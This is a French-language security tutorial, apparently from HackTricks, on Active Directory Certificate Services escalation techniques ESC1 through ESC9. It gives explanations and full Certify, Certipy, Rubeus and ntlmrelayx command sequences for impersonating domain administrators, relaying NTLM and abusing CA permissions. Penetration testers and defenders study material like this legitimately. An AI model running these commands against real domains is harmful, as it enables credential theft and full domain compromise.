# Escalade de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Ceci est un résumé des sections sur les techniques d'escalade des posts :**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modèles de certificats mal configurés - ESC1

### Explication

### Modèles de certificats mal configurés - ESC1 expliqué

- **Des droits d'enrôlement sont accordés à des utilisateurs peu privilégiés par l'Enterprise CA.**
- **L'approbation d'un manager n'est pas requise.**
- **Aucune signature d'un personnel autorisé n'est nécessaire.**
- **Les descripteurs de sécurité des modèles de certificats sont trop permissifs, permettant aux utilisateurs à faibles privilèges d'obtenir des droits d'enrôlement.**
- **Les modèles de certificats sont configurés pour définir des EKU qui facilitent l'authentification :**
- Les identifiants Extended Key Usage (EKU) tels que Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ou aucun EKU (SubCA) sont inclus.
- **Le modèle permet aux demandeurs d'inclure un subjectAltName dans la Certificate Signing Request (CSR) :**
- Active Directory (AD) priorise le subjectAltName (SAN) d'un certificat pour la vérification d'identité si celui-ci est présent. Cela signifie qu'en spécifiant le SAN dans une CSR, un certificat peut être demandé pour usurper n'importe quel utilisateur (par ex. un administrateur de domaine). La possibilité pour un demandeur de spécifier un SAN est indiquée dans l'objet AD du modèle de certificat via la propriété `mspki-certificate-name-flag`. Cette propriété est un bitmask, et la présence du flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` permet au demandeur de spécifier le SAN.

> [!CAUTION]
> La configuration décrite permet à des utilisateurs peu privilégiés de demander des certificats avec n'importe quel SAN de leur choix, autorisant l'authentification en tant que n'importe quel principal de domaine via Kerberos ou SChannel.

Cette fonctionnalité est parfois activée pour supporter la génération à la volée de certificats HTTPS ou de host par des produits ou services de déploiement, ou par manque de compréhension.

Il est à noter que la création d'un certificat avec cette option déclenche un avertissement, ce qui n'est pas le cas lorsqu'un modèle de certificat existant (comme le modèle `WebServer`, qui a `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé) est dupliqué puis modifié pour inclure un OID d'authentification.

### Abus

Pour **trouver les modèles de certificats vulnérables** vous pouvez exécuter :
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Pour **abuser de cette vulnérabilité afin d'usurper l'identité d'un administrateur**, on pourrait exécuter :
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Ensuite, vous pouvez convertir le **certificat généré au format `.pfx`** et l'utiliser pour **vous authentifier avec Rubeus ou certipy** de nouveau :
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Les binaires Windows "Certreq.exe" et "Certutil.exe" peuvent être utilisés pour générer le PFX : https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'énumération des modèles de certificats dans le schéma de configuration de la forêt AD, en particulier ceux ne nécessitant pas d'approbation ni de signatures, disposant d'un EKU Client Authentication ou Smart Card Logon, et avec le drapeau `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé, peut être effectuée en exécutant la requête LDAP suivante :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Modèles de certificats mal configurés - ESC2

### Explication

Le deuxième scénario d'abus est une variante du premier :

1. Les droits d'enrôlement sont accordés aux utilisateurs peu privilégiés par la CA d'entreprise.
2. L'exigence d'approbation par un manager est désactivée.
3. La nécessité de signatures autorisées est omise.
4. Un descripteur de sécurité trop permissif sur le modèle de certificat accorde les droits d'enrôlement de certificats à des utilisateurs peu privilégiés.
5. **Le modèle de certificat est défini pour inclure le Any Purpose EKU ou aucun EKU.**

Le **Any Purpose EKU** permet à un attaquant d'obtenir un certificat pour **n'importe quel usage**, y compris l'authentification client, l'authentification serveur, la signature de code, etc. La même **technique utilisée pour ESC3** peut être employée pour exploiter ce scénario.

Les certificats sans **EKUs**, qui agissent comme des certificats de CA subordonnée, peuvent être exploités pour **n'importe quel usage** et peuvent **également être utilisés pour signer de nouveaux certificats**. Ainsi, un attaquant pourrait spécifier des EKUs arbitraires ou des champs dans les nouveaux certificats en utilisant un certificat de CA subordonnée.

Cependant, les nouveaux certificats créés pour **authentification de domaine** ne fonctionneront pas si la CA subordonnée n'est pas approuvée par l'objet **`NTAuthCertificates`**, ce qui est le paramètre par défaut. Néanmoins, un attaquant peut toujours créer des **nouveaux certificats avec n'importe quel EKU** et des valeurs de certificat arbitraires. Ceux-ci pourraient être potentiellement **abusés** pour un large éventail d'usages (par ex., signature de code, authentification serveur, etc.) et pourraient avoir des conséquences significatives pour d'autres applications du réseau comme SAML, AD FS, ou IPSec.

Pour énumérer les modèles correspondant à ce scénario dans le schéma de configuration de la forêt AD, la requête LDAP suivante peut être exécutée :
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Modèles Enrolment Agent mal configurés - ESC3

### Explication

Ce scénario est similaire au premier et au deuxième mais **abusant** d'un **EKU différent** (Certificate Request Agent) et de **2 modèles différents** (il a donc 2 séries d'exigences),

L'**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), connu comme **Enrollment Agent** dans la documentation Microsoft, permet à un principal de **demander** un **certificat** **au nom d'un autre utilisateur**.

Le **“enrollment agent”** s'inscrit dans un tel **template** et utilise le certificat obtenu pour **co-signer une CSR au nom de l'autre utilisateur**. Il **envoie** ensuite la **CSR co-signée** à la CA, en s'enregistrant dans un **template** qui **permet l'« enroll on behalf of »**, et la CA répond avec un **certificat appartenant à l'« autre » utilisateur**.

**Exigences 1 :**

- Les droits d'enrôlement sont accordés à des utilisateurs faiblement privilégiés par l'Enterprise CA.
- L'exigence d'approbation du manager est omise.
- Aucune exigence de signatures autorisées.
- Le descripteur de sécurité du template de certificat est excessivement permissif, accordant des droits d'enrôlement à des utilisateurs faiblement privilégiés.
- Le template de certificat inclut le Certificate Request Agent EKU, permettant la demande d'autres templates de certificat au nom d'autres principals.

**Exigences 2 :**

- L'Enterprise CA accorde des droits d'enrôlement à des utilisateurs faiblement privilégiés.
- L'approbation du manager est contournée.
- La version de schéma du template est soit 1 soit supérieure à 2, et il spécifie une Application Policy Issuance Requirement qui nécessite le Certificate Request Agent EKU.
- Un EKU défini dans le template de certificat permet l'authentification de domaine.
- Les restrictions pour les enrollment agents ne sont pas appliquées sur la CA.

### Abus

Vous pouvez utiliser [**Certify**](https://github.com/GhostPack/Certify) ou [**Certipy**](https://github.com/ly4k/Certipy) pour abuser de ce scénario :
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Les **utilisateurs** autorisés à **obtenir** un **certificat d'agent d'enrôlement**, les modèles dans lesquels les **agents d'enrôlement** sont autorisés à s'enregistrer, et les **comptes** au nom desquels l'agent d'enrôlement peut agir peuvent être restreints par les CAs d'entreprise. Cela se fait en ouvrant le `certsrc.msc` **snap-in**, en **cliquant droit sur la CA**, en **cliquant sur Properties**, puis en **naviguant** vers l'onglet “Enrollment Agents”.

Cependant, il est à noter que le paramètre **par défaut** des CAs est « **Do not restrict enrollment agents**. » Lorsque la restriction sur les enrollment agents est activée par les administrateurs, en la réglant sur “Restrict enrollment agents,” la configuration par défaut reste extrêmement permissive. Elle permet à **Everyone** de s'inscrire sur tous les modèles en tant que n'importe qui.

## Contrôle d'accès vulnérable du modèle de certificat - ESC4

### **Explication**

Le **security descriptor** sur les **certificate templates** définit les **permissions** que possèdent des **AD principals** spécifiques concernant le modèle.

Si un **attaquant** possède les **permissions** requises pour **modifier** un **template** et **instaurer** l'une des **mésconfigurations exploitables** décrites dans les sections précédentes, une escalade de privilèges pourrait être facilitée.

Parmi les permissions notables applicables aux certificate templates figurent :

- **Owner:** Accorde le contrôle implicite sur l'objet, permettant la modification de n'importe quel attribut.
- **FullControl:** Donne une autorité complète sur l'objet, incluant la capacité de modifier tous les attributs.
- **WriteOwner:** Permet de changer le propriétaire de l'objet pour un principal contrôlé par l'attaquant.
- **WriteDacl:** Autorise l'ajustement des contrôles d'accès, pouvant potentiellement accorder FullControl à un attaquant.
- **WriteProperty:** Autorise la modification de n'importe quelle propriété de l'objet.

### Abus

Pour identifier les principals ayant des droits d'édition sur les templates et autres objets PKI, énumérez avec Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 correspond à un cas où un utilisateur possède des privilèges d'écriture sur un template de certificat. Cela peut, par exemple, être abusé pour écraser la configuration du template de certificat afin de rendre le template vulnérable à ESC1.

Comme on peut le voir dans le chemin ci‑dessus, seul `JOHNPC` possède ces privilèges, mais notre utilisateur `JOHN` possède le nouveau lien `AddKeyCredentialLink` vers `JOHNPC`. Puisque cette technique est liée aux certificats, j'ai implémenté cette attaque également, connue sous le nom de [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Voici un petit aperçu de la commande `shadow auto` de Certipy pour récupérer le NT hash de la victime.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** peut écraser la configuration d'un modèle de certificat avec une seule commande. Par **défaut**, Certipy va **écraser** la configuration pour la rendre **vulnérable à ESC1**. Nous pouvons aussi spécifier **le paramètre `-save-old` pour sauvegarder l'ancienne configuration**, ce qui sera utile pour **restaurer** la configuration après notre attaque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

L'importante toile de relations interconnectées basées sur les ACL, qui inclut plusieurs objets au-delà des certificate templates et de la certificate authority, peut impacter la sécurité de l'ensemble du système AD CS. Ces objets, qui peuvent affecter significativement la sécurité, comprennent :

- L'AD computer object du serveur CA, qui peut être compromis via des mécanismes comme S4U2Self ou S4U2Proxy.
- Le serveur RPC/DCOM du serveur CA.
- Tout AD object descendant ou conteneur situé dans le chemin de conteneur spécifique `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ce chemin inclut, sans s'y limiter, des conteneurs et objets tels que le Certificate Templates container, Certification Authorities container, l'objet NTAuthCertificates, et l'Enrollment Services Container.

La sécurité du système PKI peut être compromise si un attaquant à faibles privilèges parvient à prendre le contrôle de l'un de ces composants critiques.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

Le sujet abordé dans le [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) traite également des implications du flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, telles que décrites par Microsoft. Cette configuration, lorsqu'elle est activée sur une Certification Authority (CA), permet l'inclusion de **valeurs définies par l'utilisateur** dans le **nom alternatif du sujet (subject alternative name)** pour **toute demande**, y compris celles construites depuis Active Directory®. Par conséquent, cette disposition permet à un **attaquant** de s'inscrire via **n'importe quel template** configuré pour l'**authentication** de domaine — spécifiquement ceux ouverts à l'enrollment d'utilisateurs **non privilégiés**, comme le standard User template. En résultante, un certificat peut être obtenu, permettant à l'attaquant de s'authentifier en tant qu'administrateur de domaine ou **toute autre entité active** dans le domaine.

**Note** : La méthode pour ajouter des **alternative names** dans une Demande de signature de certificat (CSR), via l'argument `-attrib "SAN:"` dans `certreq.exe` (appelés “Name Value Pairs”), contraste avec la stratégie d'exploitation des SANs en ESC1. Ici, la différence réside dans la manière dont l'information de compte est encapsulée — au sein d'un attribut de certificat, plutôt que dans une extension.

### Abuse

Pour vérifier si le réglage est activé, les organisations peuvent utiliser la commande suivante avec `certutil.exe` :
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Cette opération emploie essentiellement **remote registry access**, donc une approche alternative pourrait être :
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Des outils comme [**Certify**](https://github.com/GhostPack/Certify) et [**Certipy**](https://github.com/ly4k/Certipy) sont capables de détecter cette mauvaise configuration et de l'exploiter :
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Pour modifier ces paramètres, en supposant que l'on possède les droits **d'administrateur de domaine** ou équivalents, la commande suivante peut être exécutée depuis n'importe quel poste de travail :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Pour désactiver cette configuration dans votre environnement, le flag peut être supprimé avec :
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Après les mises à jour de sécurité de mai 2022, les **certificates** nouvellement délivrés contiendront une **security extension** qui intègre la **propriété `objectSid` du demandeur**. Pour ESC1, ce SID est dérivé du SAN spécifié. Cependant, pour **ESC6**, le SID reflète la **propriété `objectSid` du demandeur**, et non le SAN.\
> Pour exploiter ESC6, il est essentiel que le système soit susceptible à ESC10 (Weak Certificate Mappings), qui privilégie le **SAN par rapport à la nouvelle security extension**.

## Contrôle d'accès vulnérable du Certificate Authority - ESC7

### Attack 1

#### Explication

Le contrôle d'accès d'une certificate authority est maintenu par un ensemble d'autorisations qui régissent les actions du CA. Ces autorisations peuvent être consultées en ouvrant `certsrv.msc`, en faisant un clic droit sur une CA, en sélectionnant Propriétés, puis en accédant à l'onglet Sécurité. De plus, les autorisations peuvent être énumérées à l'aide du module PSPKI avec des commandes telles que:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This fournit des informations sur les droits principaux, à savoir **`ManageCA`** et **`ManageCertificates`**, correspondant respectivement aux rôles « administrateur de la CA » et « gestionnaire de certificats ».

#### Abuse

Détenir les droits **`ManageCA`** sur une autorité de certification permet au principal de modifier les paramètres à distance via PSPKI. Cela inclut l'activation du drapeau **`EDITF_ATTRIBUTESUBJECTALTNAME2`** pour autoriser la spécification du SAN dans n'importe quel modèle, un aspect critique de l'escalade de domaine.

Ce processus peut être simplifié en utilisant le cmdlet **Enable-PolicyModuleFlag** de PSPKI, permettant des modifications sans interaction directe avec l'interface graphique.

La possession des droits **`ManageCertificates`** facilite l'approbation des requêtes en attente, contournant efficacement la protection "CA certificate manager approval".

Une combinaison des modules **Certify** et **PSPKI** peut être utilisée pour demander, approuver et télécharger un certificat :
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attaque 2

#### Explication

> [!WARNING]
> Dans la **attaque précédente** la permission **`Manage CA`** a été utilisée pour **activer** le flag **EDITF_ATTRIBUTESUBJECTALTNAME2** afin d'exécuter l'**attaque ESC6**, mais cela n'aura aucun effet tant que le service CA (`CertSvc`) n'aura pas été redémarré. Lorsqu'un utilisateur possède le droit d'accès `Manage CA`, il est également autorisé à **redémarrer le service**. Cependant, cela **ne signifie pas que l'utilisateur peut redémarrer le service à distance**. De plus, **ESC6 pourrait ne pas fonctionner tel quel** dans la plupart des environnements patchés en raison des mises à jour de sécurité de mai 2022.

Une autre attaque est donc présentée ici.

Prérequis:

- Seulement la **permission `ManageCA`**
- La permission **`Manage Certificates`** (peut être accordée via **`ManageCA`**)
- Le modèle de certificat **`SubCA`** doit être **activé** (peut être activé via **`ManageCA`**)

La technique repose sur le fait que les utilisateurs disposant du droit d'accès `Manage CA` _et_ `Manage Certificates` peuvent **émettre des requêtes de certificat échouées**. Le modèle de certificat **`SubCA`** est **vulnérable à ESC1**, mais **seuls les administrateurs** peuvent s'inscrire pour ce modèle. Ainsi, un **utilisateur** peut **demander** à s'inscrire pour le **`SubCA`** - qui sera **refusé** - mais **ensuite délivré par le gestionnaire**.

#### Abus

Vous pouvez **vous accorder le droit d'accès `Manage Certificates`** en ajoutant votre utilisateur comme nouvel officier.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Le **`SubCA`** template peut être **activé sur la CA** avec le paramètre `-enable-template`. Par défaut, le template `SubCA` est activé.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si nous avons rempli les prérequis pour cette attaque, nous pouvons commencer par **demander un certificat basé sur le modèle `SubCA`**.

**Cette demande sera refusée**, mais nous sauvegarderons la private key et noterons le request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Avec nos **`Manage CA` et `Manage Certificates`**, nous pouvons alors **émettre la requête de certificat échouée** avec la commande `ca` et le paramètre `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Et enfin, nous pouvons **récupérer le certificat émis** avec la commande `req` et le paramètre `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attaque 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explication

En plus des abus classiques d'ESC7 (activation des attributs EDITF ou approbation des demandes en attente), **Certify 2.0** a révélé une primitive entièrement nouvelle qui ne nécessite que le rôle *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) sur l'Enterprise CA.

La méthode RPC `ICertAdmin::SetExtension` peut être exécutée par n'importe quel principal disposant de *Manage Certificates*. Alors que la méthode était traditionnellement utilisée par des CA légitimes pour mettre à jour des extensions sur des requêtes **en attente**, un attaquant peut l'abuser pour **ajouter une extension de certificat *non par défaut*** (par exemple un OID personnalisé de *Certificate Issuance Policy* tel que `1.1.1.1`) à une requête qui attend une approbation.

Parce que le template ciblé ne définit **pas de valeur par défaut pour cette extension**, la CA n'écrasera PAS la valeur contrôlée par l'attaquant lorsque la requête sera finalement émise. Le certificat résultant contient donc une extension choisie par l'attaquant qui peut :

* Satisfaire les exigences d'Application / Issuance Policy d'autres templates vulnérables (conduisant à une escalade de privilèges).
* Injecter des EKU supplémentaires ou des policies qui accordent au certificat une confiance inattendue dans des systèmes tiers.

En bref, *Manage Certificates* — auparavant considéré comme la « moitié moins puissante » d'ESC7 — peut maintenant être exploité pour une escalade de privilèges complète ou une persistance long terme, sans toucher à la configuration de la CA ni exiger le droit plus restrictif *Manage CA*.

#### Abuser de la primitive avec Certify 2.0

1. **Soumettre une requête de certificat qui restera *en attente*.** Cela peut être forcé avec un template qui requiert l'approbation d'un manager :
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Ajouter une extension personnalisée à la requête en attente** en utilisant la nouvelle commande `manage-ca` :
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Si le template ne définit pas déjà l'extension *Certificate Issuance Policies*, la valeur ci‑dessus sera conservée après l'émission.*

3. **Émettre la requête** (si votre rôle dispose également des droits d'approbation *Manage Certificates*) ou attendre qu'un opérateur l'approuve. Une fois émise, télécharger le certificat :
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Le certificat résultant contient maintenant l'OID d'issuance-policy malveillant et peut être utilisé dans des attaques ultérieures (p.ex. ESC13, escalade de domaine, etc.).

> NOTE:  La même attaque peut être exécutée avec Certipy ≥ 4.7 via la commande `ca` et le paramètre `-set-extension`.

## NTLM Relay vers les endpoints HTTP d'AD CS – ESC8

### Explication

> [!TIP]
> Dans des environnements où **AD CS est installé**, s'il existe un **endpoint d'enrôlement web vulnérable** et qu'au moins un **certificate template est publié** qui permet **l'enrollment des ordinateurs de domaine et l'authentification client** (comme le template par défaut **`Machine`**), il devient possible pour **n'importe quel ordinateur avec le service spooler actif d'être compromis par un attaquant** !

Plusieurs **méthodes d'enrôlement basées sur HTTP** sont supportées par AD CS, mises à disposition via des rôles serveur additionnels que les administrateurs peuvent installer. Ces interfaces pour l'enrôlement par HTTP sont susceptibles aux **attaques de relais NTLM**. Un attaquant, depuis une **machine compromise**, peut usurper n'importe quel compte AD qui s'authentifie via NTLM entrant. En usurpant le compte victime, ces interfaces web peuvent être accédées par l'attaquant pour **demander un certificat d'authentification client** en utilisant les templates `User` ou `Machine`.

- L'**interface web d'enrôlement** (une ancienne application ASP disponible à `http://<caserver>/certsrv/`), est par défaut en HTTP uniquement, ce qui n'offre aucune protection contre les attaques de relais NTLM. De plus, elle permet explicitement uniquement NTLM via son en-tête Authorization HTTP, rendant les méthodes d'authentification plus sûres comme Kerberos inapplicables.
- Le **Certificate Enrollment Service** (CES), le **Certificate Enrollment Policy** (CEP) Web Service, et le **Network Device Enrollment Service** (NDES) acceptent par défaut l'authentification negotiate via leur en-tête Authorization HTTP. L'authentification negotiate **supporte à la fois** Kerberos et **NTLM**, permettant à un attaquant de **downgrader vers NTLM** lors d'attaques de relais. Bien que ces services web activent HTTPS par défaut, HTTPS seul **ne protège pas contre les attaques de relais NTLM**. La protection contre les attaques de relais NTLM pour des services HTTPS n'est possible que lorsque HTTPS est combiné avec channel binding. Malheureusement, AD CS n'active pas Extended Protection for Authentication sur IIS, ce qui est requis pour channel binding.

Un **problème** courant avec les attaques de relais NTLM est la **courte durée des sessions NTLM** et l'incapacité de l'attaquant à interagir avec des services qui **exigent NTLM signing**.

Néanmoins, cette limitation est contournée en exploitant une attaque de relais NTLM pour obtenir un certificat pour l'utilisateur, car la période de validité du certificat dicte la durée de la session, et le certificat peut être employé avec des services qui **exigent NTLM signing**. Pour des instructions sur l'utilisation d'un certificat volé, se référer à :


{{#ref}}
account-persistence.md
{{#endref}}

Une autre limitation des attaques de relais NTLM est qu'**une machine contrôlée par l'attaquant doit être authentifiée par un compte victime**. L'attaquant peut soit attendre soit tenter de **forcer** cette authentification :


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abus**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` énumère les **endpoints HTTP AD CS activés** :
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La propriété `msPKI-Enrollment-Servers` est utilisée par les Autorités de Certification d'entreprise (CAs) pour stocker les endpoints du Certificate Enrollment Service (CES). Ces endpoints peuvent être analysés et listés en utilisant l'outil **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abus avec Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abus avec [Certipy](https://github.com/ly4k/Certipy)

La demande de certificat est effectuée par Certipy par défaut en fonction du modèle `Machine` ou `User`, déterminé par le fait que le nom du compte relayé se termine par `$`. La spécification d'un modèle alternatif peut être obtenue en utilisant le paramètre `-template`.

Une technique comme [PetitPotam](https://github.com/ly4k/PetitPotam) peut alors être utilisée pour forcer l'authentification. Lorsqu'il s'agit de contrôleurs de domaine, il est nécessaire de spécifier `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Pas d'extension de sécurité - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explication

La nouvelle valeur **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) pour **`msPKI-Enrollment-Flag`**, appelée ESC9, empêche l'inclusion de la nouvelle extension de sécurité **`szOID_NTDS_CA_SECURITY_EXT`** dans un certificat. Ce flag devient pertinent lorsque `StrongCertificateBindingEnforcement` est réglé sur `1` (le paramètre par défaut), contrairement à une valeur de `2`. Sa pertinence est accrue dans des scénarios où un mappage de certificat plus faible pour Kerberos ou Schannel pourrait être exploité (comme dans ESC10), étant donné que l'absence d'ESC9 ne modifierait pas les exigences.

Les conditions dans lesquelles la configuration de ce flag devient significative incluent :

- `StrongCertificateBindingEnforcement` n'est pas réglé à `2` (le réglage par défaut étant `1`), ou `CertificateMappingMethods` inclut le flag `UPN`.
- Le certificat est marqué avec le flag `CT_FLAG_NO_SECURITY_EXTENSION` dans le paramètre `msPKI-Enrollment-Flag`.
- Un EKU d'authentification client quelconque est spécifié par le certificat.
